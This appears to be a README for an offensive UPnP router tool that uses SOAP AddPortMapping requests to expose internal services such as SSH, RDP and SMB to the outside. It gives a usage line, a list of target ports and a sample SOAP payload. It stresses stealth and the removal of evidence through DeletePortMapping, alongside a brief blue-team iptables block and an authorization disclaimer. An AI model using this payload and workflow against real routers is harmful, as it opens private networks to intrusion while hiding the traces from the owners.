# UPnP Portmapper Exploit Tool 🔥

**A stealthy UPnP router exploitation tool for bypassing NAT/firewalls**

## Core Functionality
- **Automated UPnP exploitation** via SOAP requests
- **Multi-threaded** port scanning (8 threads)
- **Proxy-aware** (127.0.0.1:8080)
- **Self-cleaning** (removes port mappings post-scan)

## Target Ports
```python
['21', '22', '23', '80', '443', '8080', '139', '445', '135', '3389', '110', '25', '49152']
```

Attack Vectors
Technique	SOAP Action	Risk
Port Forwarding	AddPortMapping	🔴 High
Firewall Bypass	NAT traversal via UPnP	🔥 Critical
Service Exposure	Internal → External port mapping	🎯 Medium

Usage
```bash

python3 upnp_control.py <router_ip> <network_prefix>
# Example:
python3 upnp_control.py external_ip local_ip
```

Exploit Workflow

Recon
    Identifies UPnP service on port 49152

Weaponize
    Injects port mapping rules via SOAP

Verify
    Checks if ports are externally accessible

Cleanup
    Removes evidence via DeletePortMapping

Red Team Benefits
    Internal network pivoting
    RDP/SSH/SMB exposure
    Low detection rate (legitimate UPnP traffic)

Blue Team Countermeasures
```bash
# Disable UPnP on routers:
iptables -A INPUT -p tcp --dport 1900 -j DROP
iptables -A INPUT -p udp --dport 1900 -j DROP
```
Sample SOAP Payload
```xml
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewRemoteHost>{target}</NewRemoteHost>
      <NewExternalPort>1337</NewExternalPort>
      <NewProtocol>TCP</NewProtocol>
      <NewInternalPort>22</NewInternalPort>
      <NewInternalClient>192.168.1.100</NewInternalClient>
    </u:AddPortMapping>
  </s:Body>
</s:Envelope>
```
⚠️ Warning: Use only on authorized systems. UPnP exploitation may violate security policies.
